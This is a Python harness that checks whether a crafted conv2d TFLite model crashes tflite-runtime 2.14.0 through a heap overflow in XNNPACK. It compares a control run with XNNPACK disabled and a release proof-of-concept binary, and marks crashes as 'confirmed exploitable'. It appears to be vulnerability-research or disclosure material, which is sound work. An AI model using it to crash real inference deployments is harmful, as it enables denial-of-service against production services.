"""
Production-level crash verification for crafted_conv2d.tflite.

Runs each test case in a subprocess so SIGSEGV doesn't kill the harness.
Tests:
  1. tflite-runtime 2.14.0 + XNNPACK (production default)  → SIGSEGV expected
  2. tflite-runtime with explicit no-delegate              → should survive
  3. Release-build XNNPACK C binary (no sanitizers)        → SIGSEGV expected
"""

import subprocess
import sys
import os
import signal

MODEL    = "/home/user/xnnpack-vuln/crafted_conv2d.tflite"
POC_BIN  = "/home/user/xnnpack-vuln/poc_igemm_release"

TFLITE_XNNPACK_SCRIPT = """
import tflite_runtime.interpreter as tflite, sys
print("[*] Creating tflite.Interpreter with XNNPACK (default)...")
sys.stdout.flush()
interp = tflite.Interpreter(model_path=sys.argv[1], num_threads=1)
print("[+] Interpreter created")
sys.stdout.flush()
print("[*] Calling allocate_tensors() ...")
sys.stdout.flush()
interp.allocate_tensors()
print("[+] allocate_tensors() returned (no crash)")
"""

TFLITE_NO_XNNPACK_SCRIPT = """
import tflite_runtime.interpreter as tflite, sys, os
# Disable XNNPACK via env var that tflite-runtime respects
os.environ["TFLITE_DISABLE_XNNPACK"] = "1"
print("[*] Creating tflite.Interpreter WITHOUT XNNPACK ...")
sys.stdout.flush()
interp = tflite.Interpreter(
    model_path=sys.argv[1],
    num_threads=1,
    experimental_delegates=[],
)
print("[+] Interpreter created")
sys.stdout.flush()
print("[*] Calling allocate_tensors() ...")
sys.stdout.flush()
interp.allocate_tensors()
print("[+] allocate_tensors() returned — no XNNPACK overflow")
details = interp.get_input_details()
print(f"[+] Input shape: {details[0]['shape']}")
"""


def sig_name(rc):
    if rc >= 0:
        return f"exit({rc})"
    sig = -rc
    names = {v: k for k, v in signal.Signals.__members__.items()}
    return f"killed by {names.get(sig, f'signal {sig}')} ({sig})"


def run_test(label, cmd, stdin_code=None, env=None):
    print(f"\n{'='*60}")
    print(f"  {label}")
    print(f"{'='*60}")
    result = subprocess.run(
        cmd,
        input=stdin_code,
        capture_output=True,
        text=True,
        env=env,
        timeout=60,
    )
    print(result.stdout.rstrip())
    if result.stderr.strip():
        # Show only non-verbose XNNPACK debug lines
        for line in result.stderr.splitlines():
            if any(x in line for x in ["Error", "error", "XNNPACK", "segfault",
                                        "Aborted", "signal", "heap", "overflow",
                                        "AddressSanitizer", "runtime error"]):
                print(f"  stderr: {line}")
    rc = result.returncode
    status = sig_name(rc)
    crash = rc < 0 or rc == 139 or rc == 134
    marker = "CRASH ✓" if crash else ("OK" if rc == 0 else f"exit({rc})")
    print(f"\n  Return code: {rc}  [{status}]  [{marker}]")
    return rc


if __name__ == "__main__":
    print("XNNPACK Conv2D Overflow — Production Crash Verification")
    print("Model:", MODEL)
    print("File size:", os.path.getsize(MODEL), "bytes")
    print()

    # Test 1: tflite-runtime + XNNPACK (default production config)
    rc1 = run_test(
        "TEST 1: tflite-runtime 2.14.0 + XNNPACK (production default)",
        [sys.executable, "-c", TFLITE_XNNPACK_SCRIPT, MODEL],
    )

    # Test 2: tflite-runtime with XNNPACK explicitly disabled (control)
    env2 = os.environ.copy()
    env2["TFLITE_DISABLE_XNNPACK"] = "1"
    rc2 = run_test(
        "TEST 2: tflite-runtime — XNNPACK DISABLED (control / baseline)",
        [sys.executable, "-c", TFLITE_NO_XNNPACK_SCRIPT, MODEL],
        env=env2,
    )

    # Test 3: Release C binary (no sanitizers)
    if os.path.exists(POC_BIN):
        rc3 = run_test(
            "TEST 3: Release C binary (no sanitizers) — direct XNNPACK API",
            [POC_BIN],
        )
    else:
        print("\n[!] Release binary not found, skipping test 3")
        rc3 = None

    # Summary
    print()
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    def yesno(rc, expect_crash):
        if rc is None:
            return "SKIPPED"
        crash = rc < 0 or rc in (139, 134)
        if expect_crash:
            return "CRASH ✓  (confirmed exploitable)" if crash else f"survived (exit {rc})"
        else:
            return "survived (not vulnerable — control OK)" if rc == 0 else f"crash! (unexpected, exit {rc})"

    print(f"  tflite + XNNPACK (production): {yesno(rc1, True)}")
    print(f"  tflite no XNNPACK  (control) : {yesno(rc2, False)}")
    if rc3 is not None:
        print(f"  release C binary  (no asan)  : {yesno(rc3, True)}")
    print()
    print("Model file: crafted_conv2d.tflite (688 bytes)")
    print("Crash trigger: tflite.Interpreter() → allocate_tensors()")
    print("               → reshape_igemm → xnn_indirection_init_conv2d")
    print("               → write 17 TB into 61,472-byte heap buffer → SIGSEGV")
